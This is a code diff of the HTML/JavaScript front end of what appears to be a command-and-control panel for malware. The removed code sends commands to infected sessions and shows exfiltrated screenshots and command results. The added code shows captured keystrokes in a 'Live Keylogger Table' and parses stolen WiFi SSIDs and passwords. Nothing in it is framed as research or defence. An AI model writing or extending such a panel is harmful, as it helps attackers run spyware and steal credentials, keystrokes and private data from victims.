-            try {
-                const r = await fetch(API + '/api/send_command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target_session: sessionId,
-                        command_type: type,
-                        parameters: params,
-                        scheduled_time: sched
-                    })
-                });
-                const d = await r.json();
-                if (d.success) {
-                    showToast('â–¶ ' + type + ' sent! ID: ' + d.command_id.substring(0, 12) + '...', 'success');
-                    log('Sent [' + type + '] to ' + sessionId + ' (ID: ' + d.command_id + ')', 'info');
-                    closeModal('commandModal');
-                    loadCommands();
-                } else {
-                    showToast('Error: ' + d.error, 'error');
-                }
-            } catch (e) {
-                showToast('Error: ' + e.message, 'error');
+            // 4. Live Keylogger Table
+            const tblKeylog = document.getElementById('tblKeylog');
+            if(keylogs.length > 0) {
+                tblKeylog.innerHTML = keylogs.slice(0, 5).map(k => {
+                    const time = k.timestamp ? new Date(k.timestamp._seconds * 1000).toLocaleTimeString() : '-';
+                    const content = k.data ? (k.data.substring(0,40) + '...') : '';
+                    return `
+                    <tr>
+                        <td style="color:#00a4ef;">${(k.sessionId||'').substring(0,8)}</td>
+                        <td>${content}</td>
+                        <td>${time}</td>
+                    </tr>
+                `}).join('');
+            }
+
+            // 5. Extracted WiFi Profiles
+            const tblWifi = document.getElementById('tblWifi');
+            if(wifis.length > 0) {
+                tblWifi.innerHTML = wifis.slice(0, 5).map(w => {
+                    const time = w.timestamp ? new Date(w.timestamp._seconds * 1000).toLocaleTimeString() : '-';
+                    let ssid = 'Unknown', pass = '***';
+                    try {
+                        // Attempt to parse string data if it's formatted as expected
+                        if(typeof w.data === 'string') {
+                            const match = w.data.match(/SSID: (.*?)\n.*?Password: (.*)/s);
+                            if(match) {
+                                ssid = match[1].trim();
+                                pass = match[2].trim();
+                            } else {
+                                ssid = w.data.substring(0, 15) + '...';
+                            }
+                        }
+                    } catch(e) {}
+                    return `
+                    <tr>
+                        <td style="font-weight:500;">${ssid}</td>
+                        <td>${pass}</td>
+                        <td>${time}</td>
+                    </tr>
+                `}).join('');
             }
         }
 
-        // ============ COMMANDS ============
-        async function loadCommands() {
-            try {
-                const r = await fetch(API + '/api/exfil_data');
-                const d = await r.json();
-                const tbody = document.getElementById('commandsBody');
-
-                if (!d.success || !d.data) {
-                    tbody.innerHTML = '<tr><td colspan="6" style="color:#555;text-align:center;">No data</td></tr>';
-                    return;
-                }
-
-                const cmds = d.data.filter(x => x.type === 'command_result' || x.command_type);
-                document.getElementById('statPending').textContent = cmds.filter(c => c.status === 'pending').length;
-
-                if (cmds.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="6" style="color:#555;text-align:center;">No commands yet</td></tr>';
-                } else {
-                    tbody.innerHTML = cmds.slice(0, 50).map(c => {
-                        const t = c.timestamp ? new Date(c.timestamp._seconds * 1000).toLocaleString() : '?';
-                        const st = (c.status || '?').toUpperCase();
-                        const stCls = st === 'COMPLETED' ? 'status-completed' : st === 'ERROR' ? 'status-error' : 'status-pending';
-                        return `<tr>
-                    <td style="color:#555;font-size:11px;">${(c.command_id || c.id || '?').substring(0, 12)}</td>
-                    <td style="color:#88f;font-size:11px;">${(c.sessionId || '?').substring(0, 12)}</td>
-                    <td>${c.command_type || c.type || '?'}</td>
-                    <td class="${stCls}">${st}</td>
-                    <td style="color:#555;font-size:11px;">${t}</td>
-                    <td style="font-size:11px;color:#0f0;">${(c.result || c.error || '-').substring(0, 80)}</td>
-                </tr>`;
-                    }).join('');
-                }
-            } catch (e) {
-                log('Commands load failed: ' + e.message, 'error');
-            }
-        }
-
-        // ============ EXFIL ============
-        async function loadExfil() {
-            try {
-                const filter = document.getElementById('exfilFilter').value;
-                const search = document.getElementById('exfilSearch').value;
-                let url = API + '/api/exfil_data';
-                if (search) url += '?session_id=' + encodeURIComponent(search);
-
-                const r = await fetch(url);
-                const d = await r.json();
-                const container = document.getElementById('exfilData');
-
-                if (!d.success || !d.data || d.data.length === 0) {
-                    container.innerHTML = '<div style="color:#555;text-align:center;padding:20px;">No data exfiltrated</div>';
-                    return;
-                }
-
-                let items = d.data;
-                if (filter !== 'all') items = items.filter(i => i.type === filter);
-
-                document.getElementById('statExfil').textContent = items.length;
-
-                container.innerHTML = items.slice(0, 50).map(item => {
-                    const t = item.timestamp ? new Date(item.timestamp._seconds * 1000).toLocaleString() : '?';
-                    const sid = item.sessionId || item.session_id || '?';
-
-                    let content = '';
-                    if (item.type === 'screenshot' && item.data) {
-                        content = `<img src="data:image/png;base64,${item.data}" onclick="showScreenshot('data:image/png;base64,${item.data}')">`;
-                    } else if (item.data && typeof item.data === 'string' && item.data.length > 100) {
-                        content = `<pre>${item.data.substring(0, 500)}${item.data.length > 500 ? '...' : ''}</pre>`;
-                    } else {
-                        content = `<pre>${JSON.stringify(item, null, 2).substring(0, 500)}</pre>`;
-                    }
-
-                    return `<div class="exfil-item">
-                <div class="header">
-                    <span class="type">${item.type || 'data'}</span>
-                    <span>${t} | ${sid.substring(0, 12)}...</span>
-                </div>
-                ${content}
-            </div>`;
-                }).join('');
-
-                log('Loaded ' + items.length + ' exfil records', 'info');
-            } catch (e) {
-                document.getElementById('exfilData').innerHTML = '<div style="color:#f00;">Error: ' + e.message + '</div>';
-            }
-        }
-
-        function showScreenshot(src) {
-            document.getElementById('screenshotFull').src = src;
-            openModal('screenshotModal');
-        }
-
-        // ============ REFRESH ============
-        function refreshAll() {
-            loadAgents();
-            loadCommands();
-            loadExfil();
-            showToast('Refreshed', 'info');
-        }
-
-        // ============ INIT ============
-        function init() {
-            loadAgents();
-            loadCommands();
-            loadExfil();
-            refreshTimer = setInterval(() => { loadAgents(); loadCommands(); }, 15000);
-            log('Dashboard ready. Auto-refresh every 15s.', 'info');
-        }
-
-        document.addEventListener('DOMContentLoaded', init);
+        // Init
+        fetchDashboardData();
+        setInterval(fetchDashboardData, 10000); // refresh every 10s
     </script>
 </body>
-
 </html>
-
